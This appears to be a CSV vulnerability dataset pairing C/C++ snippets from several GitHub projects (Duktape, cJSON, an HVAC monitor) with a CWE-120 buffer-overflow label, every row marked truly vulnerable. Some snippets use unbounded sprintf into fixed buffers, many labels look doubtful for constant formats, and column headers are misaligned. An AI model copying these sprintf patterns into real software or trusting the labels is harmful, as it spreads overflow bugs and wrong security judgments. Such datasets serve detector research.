GithubID,Year,FullPath,Codesnippet,CWE,isTrueVulnerable,Codesnippet5
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""buffer:external:%p:%ld"",",120,1,"		if (DUK_HBUFFER_HAS_EXTERNAL(h)) {
			duk_hbuffer_external *g = (duk_hbuffer_external *) h;
			duk_fb_sprintf(fb, ""buffer:external:%p:%ld"",
			               (void *) DUK_HBUFFER_EXTERNAL_GET_DATA_PTR(NULL, g),
			               (long) DUK_HBUFFER_EXTERNAL_GET_SIZE(g));
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""buffer:dynamic:%p:%ld"",",120,1,"		} else {
			duk_hbuffer_dynamic *g = (duk_hbuffer_dynamic *) h;
			duk_fb_sprintf(fb, ""buffer:dynamic:%p:%ld"",
			               (void *) DUK_HBUFFER_DYNAMIC_GET_DATA_PTR(NULL, g),
			               (long) DUK_HBUFFER_DYNAMIC_GET_SIZE(g));
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""buffer:fixed:%ld"", (long) DUK_HBUFFER_GET_SIZE(h));",120,1,"		}
	} else {
		duk_fb_sprintf(fb, ""buffer:fixed:%ld"", (long) DUK_HBUFFER_GET_SIZE(h));
	}

"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""=["");",120,1,"
	if (st->hexdump) {
		duk_fb_sprintf(fb, ""=["");
		n = DUK_HBUFFER_GET_SIZE(h);
		p = (duk_uint8_t *) DUK_HBUFFER_GET_DATA_PTR(NULL, h);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""%02lx"", (unsigned long) p[i]);",120,1,"		p = (duk_uint8_t *) DUK_HBUFFER_GET_DATA_PTR(NULL, h);
		for (i = 0; i < n; i++) {
			duk_fb_sprintf(fb, ""%02lx"", (unsigned long) p[i]);
		}
		duk_fb_sprintf(fb, ""]"");
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""]"");",120,1,"			duk_fb_sprintf(fb, ""%02lx"", (unsigned long) p[i]);
		}
		duk_fb_sprintf(fb, ""]"");
	}
}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""[unknown htype %ld]"", (long) DUK_HEAPHDR_GET_TYPE(h));",120,1,"		break;
	default:
		duk_fb_sprintf(fb, ""[unknown htype %ld]"", (long) DUK_HEAPHDR_GET_TYPE(h));
		break;
	}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""(%p)"", (void *) tv);",120,1,"
	if (st->heavy) {
		duk_fb_sprintf(fb, ""(%p)"", (void *) tv);
	}

"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""%02lx"", (unsigned long) ((duk_uint8_t *)tv)[i]);",120,1,"		duk_fb_put_byte(fb, (duk_uint8_t) DUK_ASC_LBRACKET);
		for (i = 0; i < (duk_size_t) sizeof(*tv); i++) {
			duk_fb_sprintf(fb, ""%02lx"", (unsigned long) ((duk_uint8_t *)tv)[i]);
		}
		duk_fb_put_byte(fb, (duk_uint8_t) DUK_ASC_RBRACKET);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""pointer:%p"", (void *) DUK_TVAL_GET_POINTER(tv));",120,1,"	}
	case DUK_TAG_POINTER: {
		duk_fb_sprintf(fb, ""pointer:%p"", (void *) DUK_TVAL_GET_POINTER(tv));
		break;
	}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""lightfunc:"");",120,1,"
		DUK_TVAL_GET_LIGHTFUNC(tv, func, lf_flags);
		duk_fb_sprintf(fb, ""lightfunc:"");
		duk_fb_put_funcptr(fb, (duk_uint8_t *) &func, sizeof(func));
		duk_fb_sprintf(fb, "":%04lx"", (long) lf_flags);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, "":%04lx"", (long) lf_flags);",120,1,"		duk_fb_sprintf(fb, ""lightfunc:"");
		duk_fb_put_funcptr(fb, (duk_uint8_t *) &func, sizeof(func));
		duk_fb_sprintf(fb, "":%04lx"", (long) lf_flags);
		break;
	}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""%.18g_F"", (double) DUK_TVAL_GET_NUMBER(tv));",120,1,"		DUK_ASSERT(!DUK_TVAL_IS_UNUSED(tv));
		DUK_ASSERT(DUK_TVAL_IS_NUMBER(tv));
		duk_fb_sprintf(fb, ""%.18g_F"", (double) DUK_TVAL_GET_NUMBER(tv));
		break;
#endif
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""%.18g"", (double) DUK_TVAL_GET_NUMBER(tv));",120,1,"		DUK_ASSERT(!DUK_TVAL_IS_UNUSED(tv));
		DUK_ASSERT(DUK_TVAL_IS_NUMBER(tv));
		duk_fb_sprintf(fb, ""%.18g"", (double) DUK_TVAL_GET_NUMBER(tv));
		break;
	}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""%s %ld (to pc%c%ld)"",",120,1,"		duk_int_t diff2 = diff1 + 1;                                          /* from curr pc */

		duk_fb_sprintf(fb, ""%s %ld (to pc%c%ld)"",
		               (const char *) op_name, (long) diff1,
		               (int) (diff2 >= 0 ? '+' : '-'),  /* char format: use int */
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""%s %ld, %ld, %ld"",",120,1,"		               (long) (diff2 >= 0 ? diff2 : -diff2));
	} else {
		duk_fb_sprintf(fb, ""%s %ld, %ld, %ld"",
		               (const char *) op_name, (long) DUK_DEC_A(ins),
		               (long) DUK_DEC_B(ins), (long) DUK_DEC_C(ins));
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""?(%ld)"", (long) opcode);",120,1,"
	if (opcode < DUK_BC_OP_MIN || opcode > DUK_BC_OP_MAX) {
		duk_fb_sprintf(fb, ""?(%ld)"", (long) opcode);
	} else {
		duk_fb_sprintf(fb, ""%s"", (const char *) duk__bc_optab[opcode]);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""%s"", (const char *) duk__bc_optab[opcode]);",120,1,"		duk_fb_sprintf(fb, ""?(%ld)"", (long) opcode);
	} else {
		duk_fb_sprintf(fb, ""%s"", (const char *) duk__bc_optab[opcode]);
	}
}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""[catcher ptr=%p parent=%p varname=%p pc_base=%p, idx_base=%ld, flags=0x%08lx]"",",120,1,"	}

	duk_fb_sprintf(fb, ""[catcher ptr=%p parent=%p varname=%p pc_base=%p, idx_base=%ld, flags=0x%08lx]"",
	               (void *) cat,
	               (void *) cat->parent, (void *) cat->h_varname, (void *) cat->pc_base,
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""[activation ptr=%p tv_func=<omit> func=%p parent=%p var_env=%p lex_env=%p cat=%p curr_pc=%p bottom_byteoff=%ld retval_byteoff=%ld reserve_byteoff=%ld flags=%ld]"",",120,1,"	/* prev_caller: conditional, omitted on purpose, it's rarely used. */
	/* prev_line: conditional, omitted on purpose (but would be nice). */
	duk_fb_sprintf(fb, ""[activation ptr=%p tv_func=<omit> func=%p parent=%p var_env=%p lex_env=%p cat=%p curr_pc=%p bottom_byteoff=%ld retval_byteoff=%ld reserve_byteoff=%ld flags=%ld]"",
	               (void *) act,
	               (void *) act->func, (void *) act->parent, (void *) act->var_env,
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(&fb, ""(%p)"", (void *) t);",120,1,"				duk_tval *t = va_arg(ap, duk_tval *);
				if (st.pointer && !st.heavy) {
					duk_fb_sprintf(&fb, ""(%p)"", (void *) t);
				}
				duk__print_tval(&st, t);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(&fb, fmtbuf, arg);",120,1,"					/* %f and %lf both consume a 'long' */
					double arg = va_arg(ap, double);
					duk_fb_sprintf(&fb, fmtbuf, arg);
				} else if (ch == DUK_ASC_LC_D && got_long) {
					/* %ld */
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(&fb, ""NULL"");",120,1,"						 * it for debug printing.
						 */
						duk_fb_sprintf(&fb, ""NULL"");
					} else {
						duk_fb_sprintf(&fb, fmtbuf, arg);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(&fb, ""INVALID-FORMAT(%s)"", (const char *) fmtbuf);",120,1,"				} else {
					/* Should not happen. */
					duk_fb_sprintf(&fb, ""INVALID-FORMAT(%s)"", (const char *) fmtbuf);
				}
				break;
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_push_sprintf(thr, "" (line %ld%s)"",",120,1,"		                 (long) thr->compile_ctx->lex.window[1].codepoint));

		duk_push_sprintf(thr, "" (line %ld%s)"",
		                 (long) thr->compile_ctx->curr_token.start_line,
		                 at_end ? "", end of input"" : """");
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.h,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.h,"DUK_EXTERNAL_DECL const char *duk_push_sprintf(duk_context *ctx, const char *fmt, ...);",120,1,"DUK_EXTERNAL_DECL const char *duk_push_lstring(duk_context *ctx, const char *str, duk_size_t len);
DUK_EXTERNAL_DECL void duk_push_pointer(duk_context *ctx, void *p);
DUK_EXTERNAL_DECL const char *duk_push_sprintf(duk_context *ctx, const char *fmt, ...);
DUK_EXTERNAL_DECL const char *duk_push_vsprintf(duk_context *ctx, const char *fmt, va_list ap);

"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.h,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.h,"DUK_EXTERNAL_DECL const char *duk_push_vsprintf(duk_context *ctx, const char *fmt, va_list ap);",120,1,"DUK_EXTERNAL_DECL void duk_push_pointer(duk_context *ctx, void *p);
DUK_EXTERNAL_DECL const char *duk_push_sprintf(duk_context *ctx, const char *fmt, ...);
DUK_EXTERNAL_DECL const char *duk_push_vsprintf(duk_context *ctx, const char *fmt, va_list ap);

/* duk_push_literal() may evaluate its argument (a C string literal) more than
"
2021\haas-mini-program\engine\lite_engine\core\be.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\core\be.c,"sprintf(tmpPath, ""./%s"", name);",120,1,"    /* add ""./"" */
    char *tmpPath = amp_calloc(1, 3 + strlen(name));
    sprintf(tmpPath, ""./%s"", name);
    char *clearPath   = getClearPath(tmpPath);
    firstDir->dirname = getFilePath(clearPath);
"
2021\haas-mini-program\engine\lite_engine\core\be_executor.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\core\be_executor.c,"sprintf(errMsg, ""OBJ:%s"", objectName);",120,1,"                                } else {
#ifndef BE_JSE_SILENT
                                    sprintf(errMsg, ""OBJ:%s"", objectName);
                                    be_amp_error_at(errMsg, vm.lex,
                                                    vm.lex->token_last_end);
"
2021\haas-mini-program\engine\lite_engine\core\be_symbol.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\core\be_symbol.c,"sprintf(evalstr, ""(%.*s)"", json_str_len, json_str);",120,1,"    char *s2 = strchr(json_str, '{');
    if ((s1 && (s1 - json_str) == 0) || (s2 && (s2 - json_str) == 0)) {
        sprintf(evalstr, ""(%.*s)"", json_str_len, json_str);
    } else {
        sprintf(evalstr, ""(%.*s)"", (int)strlen(""({})""), ""({})"");
"
2021\haas-mini-program\engine\lite_engine\core\be_symbol.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\core\be_symbol.c,"sprintf(evalstr, ""(%.*s)"", (int)strlen(""({})""), ""({})"");",120,1,"        sprintf(evalstr, ""(%.*s)"", json_str_len, json_str);
    } else {
        sprintf(evalstr, ""(%.*s)"", (int)strlen(""({})""), ""({})"");
    }

"
2021\haas-mini-program\engine\lite_engine\core\be_utils.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\core\be_utils.c,"sprintf(fullPath, ""%s/%s"", JSE_FS_ROOT_DIR, path);",120,1,"    path_len = strlen(path) + 128;
    fullPath = amp_calloc(1, path_len);
    sprintf(fullPath, ""%s/%s"", JSE_FS_ROOT_DIR, path);

    /* clear ./ */
"
2021\haas-mini-program\engine\lite_engine\core\be_utils.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\core\be_utils.c,"sprintf(fullPath, ""%s"", json_data);",120,1,"    /* clear ./ */
    json_data = getClearPath(fullPath);
    sprintf(fullPath, ""%s"", json_data);
    amp_free(json_data);

"
2021\haas-mini-program\engine\lite_engine\core\be_utils.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\core\be_utils.c,"sprintf(fullPath, ""%s/%s"", path, item->valuestring);",120,1,"        if (NULL != item && aJSON_String == item->type &&
            strstr(item->valuestring, "".js"")) {
            sprintf(fullPath, ""%s/%s"", path, item->valuestring);

            amp_free(json_data);
"
2021\haas-mini-program\engine\lite_engine\core\be_utils.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\core\be_utils.c,"sprintf(fullPath, ""%s/src/%s"", path, ""index.js"");",120,1,"               __LINE__, fullPath);
        /* default index.js */
        sprintf(fullPath, ""%s/src/%s"", path, ""index.js"");
        return fullPath;
    } else {
"
2021\haas-mini-program\engine\lite_engine\include\be_utils.h,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\include\be_utils.h,"#define itoa(val, str, base) sprintf(str, ""%d"", val)",120,1,"#endif

#define itoa(val, str, base) sprintf(str, ""%d"", val)
#define ftoa(val, str) sprintf(str, ""%g"", val)

"
2021\haas-mini-program\engine\lite_engine\include\be_utils.h,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\include\be_utils.h,"#define ftoa(val, str) sprintf(str, ""%g"", val)",120,1,"
#define itoa(val, str, base) sprintf(str, ""%d"", val)
#define ftoa(val, str) sprintf(str, ""%g"", val)

#if defined(__GNUC__) && !defined(__clang__)
"
2021\haas-mini-program\services\amp_utils\amp_utils.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\services\amp_utils\amp_utils.c,"sprintf((char *)ascii + i % 16, ""%c"",",120,1,"            written += 1;
        }
        sprintf((char *)ascii + i % 16, ""%c"",
                ((buf[i] >= ' ' && buf[i] <= '~') ? buf[i] : '.'));

"
2021\haas-mini-program\services\app_mgr\app_mgr.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\services\app_mgr\app_mgr.c,"sprintf(msg, ""%d/%d"", jspacksize, header.pack_size);",120,1,"    char msg[128];
    if (jspacksize >= JSEPACK_HEADER_SIZE) {
        sprintf(msg, ""%d/%d"", jspacksize, header.pack_size);
    }
}
"
2021\haas-mini-program\services\app_mgr\app_mgr.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\services\app_mgr\app_mgr.c,"sprintf(http_buffer, HTTP_HEADER, host_file, host_addr, port);",120,1,"
    breakpoint = 0;
    sprintf(http_buffer, HTTP_HEADER, host_file, host_addr, port);

    send      = 0;
"
2021\haas-mini-program\services\app_mgr\app_mgr.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\services\app_mgr\app_mgr.c,"sprintf(msg, ""%d/%d"", total_recv, upgrade_file_size);",120,1,"
    total_recv += buf_len;
    sprintf(msg, ""%d/%d"", total_recv, upgrade_file_size);

    if (((total_recv - last_buf_len) > OTA_BUFFER_MAX_SIZE * 2) ||
"
2021\haas-mini-program\utils\cJSON\cJSON.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\cJSON\cJSON.c,"sprintf(version, ""%i.%i.%i"", CJSON_VERSION_MAJOR, CJSON_VERSION_MINOR, CJSON_VERSION_PATCH);",120,1,"{
    static char version[15];
    sprintf(version, ""%i.%i.%i"", CJSON_VERSION_MAJOR, CJSON_VERSION_MINOR, CJSON_VERSION_PATCH);

    return version;
"
2021\healthyhome\monitoring-server\libs\linux-i2c\src\Driver.cpp,Dataset Download,../../Dataset Download/2021\healthyhome\monitoring-server\libs\linux-i2c\src\Driver.cpp,"sprintf(filename, FILE_PATTERN, deviceId);",120,1,"
    char filename[FILE_NAME_LENGTH];
    sprintf(filename, FILE_PATTERN, deviceId);

    if ((fd = ::open(filename, O_RDWR)) < 0) {
"
2021\HVAC-Monitoring-System\connmgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\connmgr.c,"asprintf(&send_buf, ""%ld Connection Manager: invalid PORT"", time(NULL));",120,1,"    if(port_number < MIN_PORT || port_number > MAX_PORT) 
    {
        asprintf(&send_buf, ""%ld Connection Manager: invalid PORT"", time(NULL));
        write_to_pipe(ipc_pipe_mutex, pfds, send_buf);

"
2021\HVAC-Monitoring-System\connmgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\connmgr.c,"asprintf(&send_buf, ""%ld Connection Manager: failed to start"", time(NULL));",120,1,"        *retval = CONNMGR_SERVER_OPEN_ERROR; // her setting poll_fds and socket_list to NULL is not needed as it was allocated already
        
        asprintf(&send_buf, ""%ld Connection Manager: failed to start"", time(NULL));
        write_to_pipe(ipc_pipe_mutex, pfds, send_buf);
        
"
2021\HVAC-Monitoring-System\connmgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\connmgr.c,"asprintf(&send_buf, ""%ld Connection Manager: started successfully"", time(NULL));",120,1,"    }

    asprintf(&send_buf, ""%ld Connection Manager: started successfully"", time(NULL));
    write_to_pipe(ipc_pipe_mutex, pfds, send_buf);

"
2021\HVAC-Monitoring-System\connmgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\connmgr.c,"asprintf(&send_buf, ""%ld Connection Manager: signalled to terminate by Storage Manager"", time(NULL));",120,1,"            *retval = CONNMGR_INTERRUPTED_BY_STORAGEMGR;

            asprintf(&send_buf, ""%ld Connection Manager: signalled to terminate by Storage Manager"", time(NULL));
            write_to_pipe(ipc_pipe_mutex, pfds, send_buf);

"
2021\HVAC-Monitoring-System\connmgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\connmgr.c,"asprintf(&send_buf, ""%ld Connection Manager: failed to accept new connection (%d)"", time(NULL), tcp_conn_res);",120,1,"                *retval = CONNMGR_SERVER_CONNECTION_ERROR;

                asprintf(&send_buf, ""%ld Connection Manager: failed to accept new connection (%d)"", time(NULL), tcp_conn_res);
                write_to_pipe(ipc_pipe_mutex, pfds, send_buf);
            } else
"
2021\HVAC-Monitoring-System\connmgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\connmgr.c,"asprintf(&send_buf, ""%ld Connection Manager: new connection received"", time(NULL));",120,1,"                dpl_insert_sorted(socket_list, client, false); // Insert connection into dplist
                
                asprintf(&send_buf, ""%ld Connection Manager: new connection received"", time(NULL));
                write_to_pipe(ipc_pipe_mutex, pfds, send_buf);

"
2021\HVAC-Monitoring-System\connmgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\connmgr.c,"asprintf(&send_buf, ""%ld Connection Manager: lost connection with"", time(NULL));",120,1,"                    poll_fds[i].events = -1;
                    
                    asprintf(&send_buf, ""%ld Connection Manager: lost connection with"", time(NULL));
                    write_to_pipe(ipc_pipe_mutex, pfds, send_buf);
                }
"
2021\HVAC-Monitoring-System\connmgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\connmgr.c,"asprintf(&send_buf, ""%ld Connection Manager: signalled to drop connection to %""PRIu16, time(NULL), client->sensor);",120,1,"                    pthread_mutex_unlock(connmgr_drop_conn_mutex);

                    asprintf(&send_buf, ""%ld Connection Manager: signalled to drop connection to %""PRIu16, time(NULL), client->sensor);
                    write_to_pipe(ipc_pipe_mutex, pfds, send_buf);
                } else pthread_mutex_unlock(connmgr_drop_conn_mutex);
"
